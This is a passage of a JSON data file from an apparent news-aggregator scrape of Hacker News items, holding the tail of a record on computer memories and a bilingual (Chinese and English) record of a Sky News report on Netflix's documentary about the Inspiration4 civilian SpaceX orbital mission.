"\u7535\u8111,\u8bb0\u5fc6,memories,\u5b58\u50a8", "title": "\u5947\u602a\u7684\u8bb0\u5fc6\uff0c\u7535\u8111\u8fc7\u53bb\u7684\u8bb0\u5fc6", "title_en": "Memories of Weird Memories, of Computers Past", "transed": 1, "url": "https://madned.substack.com/p/whats-in-store", "via": "", "real_tags": ["\u7535\u8111", "\u8bb0\u5fc6", "memories", "\u5b58\u50a8"]}, {"category": "", "categoryclass": "", "imagename": "a525c5831468fe064c00ca8feeff7e91.jpg", "infoid": 1071331, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Netflix \u5c06\u5728\u4e0b\u4e2a\u6708\u64ad\u653e\u4e00\u90e8\u7eaa\u5f55\u7247\uff0c\u8bb2\u8ff0\u4e16\u754c\u4e0a\u7b2c\u4e00\u4e2a\u79c1\u4eba\u5168\u6c11\u7528\u592a\u7a7a\u8f68\u9053\u7684\u6545\u4e8b\u3002\u8be5\u5c0f\u7ec4\u5c06\u5728\u4e0b\u4e2a\u6708\u767b\u4e0a SpaceX \u592a\u7a7a\u8231\uff0c\u5e76\u5728\u5730\u7403\u8f68\u9053\u4e0a\u98de\u884c\u4e09\u5929\uff0c\u6210\u4e3a Netflix \u7684\u7b2c\u4e00\u90e8\u201c\u8fd1\u4e4e\u5b9e\u65f6\u5730\u62a5\u9053\u4e8b\u4ef6\u201d\u7684\u7eaa\u5f55\u7247\u3002\u8fd9\u6b21\u79c1\u4eba\u5305\u673a\u5c06\u7531 38 \u5c81\u7684\u4ebf\u4e07\u5bcc\u7fc1\u8d3e\u91cc\u5fb7\u00b7\u827e\u8428\u514b\u66fc (Jared Isaacman) \u6307\u6325\u3001\u8d44\u52a9\u548c\u9886\u5bfc\uff0c\u65e8\u5728\u4e3a\u5723\u88d8\u5fb7\u513f\u7ae5\u7814\u7a76\u533b\u9662\u63d0\u4f9b 2 \u4ebf\u7f8e\u5143\u7684\u652f\u6301\u3002\u5728@spacex Falcon 9 \u706b\u7bad\u4e0a\u5199\u4e0b\u6211\u7684\u540d\u5b57\uff0c\u5b83\u5c06\u628a\u6211\u548c\u6211\u7684\u8239\u5458\u5e26\u5230\u592a\u7a7a\u3002 \ud83e\udd2f pic.twitter.com/MuscPe3j3B \u2014 \u666e\u7f57\u514b\u7279\u535a\u58eb (@DrSianProctor) 2021 \u5e74 8 \u6708 3 \u65e5 \u5730\u7403\u79d1\u5b66\u5bb6\u3001\u524d NASA \u5019\u9009\u4eba Sian Proctor\u3001\u7f8e\u56fd\u7a7a\u519b\u9000\u4f0d\u519b\u4eba Christopher Sembroski \u548c\u533b\u751f\u6d77\u8389 Arceneaux \u5c06\u52a0\u5165\u4ed6\u7684\u884c\u5217St Jude \u7684\u52a9\u7406\u548c\u513f\u7ae5\u764c\u75c7\u5e78\u5b58\u8005\u3002\u8be5\u5c0f\u7ec4\u663e\u7136\u5c06\u5230\u8fbe\u6bd4\u56fd\u9645\u7a7a\u95f4\u7ad9\u66f4\u9ad8\u7684\u9ad8\u5ea6\uff0c\u56e0\u4e3a\u4ed6\u4eec\u4e58\u5750 SpaceX Dragon \u592a\u7a7a\u8231\u73af\u7ed5\u5730\u7403\u8fd0\u884c\uff0c\u79f0\u4e3a Inspiration4\u3002\n\u8fd9\u90e8\u5feb\u901f\u5468\u8f6c\u7684\u7eaa\u5f55\u7247\u5c06\u5206\u4e3a\u4e94\u90e8\u5206\uff0c\u524d\u4e24\u90e8\u5206\u5c06\u4e8e 9 \u6708 6 \u65e5\u9996\u6620\u3002 Inspiration4 \u7684\u5b9e\u9645\u53d1\u5e03\u5b9a\u4e8e 9 \u6708 15 \u65e5 - \u8be5\u6d3b\u52a8\u5c06\u5728\u672c\u6708\u5e95\u7684\u6700\u540e\u4e00\u90e8\u5206\u4e2d\u5c55\u793a\u3002\u89c2\u4f17\u5df2\u88ab\u627f\u8bfa\u5728\u5e55\u540e\u8bbf\u95ee\u4efb\u52a1 - \u4ece\u4ed6\u4eec\u7684\u9009\u62e9\uff0c\u5230\u822a\u5929\u5668\u7ed5\u5730\u7403\u8fd0\u884c\u65f6\u7684\u5185\u90e8\u955c\u5934\u3002", "note_en": "Netflix will stream a documentary next month which will follow the story of the world&#39;s first private all-civilian space orbit.\n The group will board a   SpaceX capsule next month and spend three days orbiting the Earth, becoming Netflix&#39;s first documentary &#34;to cover an event in near real-time&#34;.\n  The privately chartered flight will be commanded, funded and led by 38-year-old billionaire Jared Isaacman, and aim to support St Jude Children&#39;s Research Hospital to the tune of $200 million.\n Writing my name on the  @spacex Falcon 9 rocket that will take me and my crew mates to space. \ud83e\udd2f  pic.twitter.com/MuScPe3j3B\n\u2014 Doctor Proctor (@DrSianProctor)  August 3, 2021\n He will be joined on board by Sian Proctor, a geoscientist and former NASA candidate, Christopher Sembroski, a US Airforce veteran, and Hayley Arceneaux, a doctor&#39;s assistant at St Jude and childhood cancer survivor.\n The group will apparently reach a higher altitude than the International Space Station as they orbit the planet in the SpaceX Dragon capsule, dubbed Inspiration4.\n   The quick-turnaround documentary will be made in five parts, with the first two premiering on 6 September.\n  Inspiration4&#39;s actual launch is scheduled for 15 September - an event which will feature in the final part at the end of the month.\n Viewers have been promised behind the scenes access of the mission - from their selection, to footage from inside the spacecraft while it orbits Earth.", "posttime": "2021-08-05 20:52:45", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u516c\u5e03,announces,\u5730\u7403", "title": "Netflix \u516c\u5e03 Space X \u7eaa\u5f55\u7247\uff0c\u8bb2\u8ff0\u5e73\u6c11\u8fdb\u5165\u8f68\u9053\u7684\u4efb\u52a1", "title_en": "Netflix announces Space X documentary on civilian mission into orbit", "transed": 1, "url": "https://news.sky.com/story/netflix-announces-space-x-documentary-on-civilian-mission-into-orbit-12372247", "via": "", "real_tags": ["\u516c\u5e03", "announces", "\u5730\u7403"]}]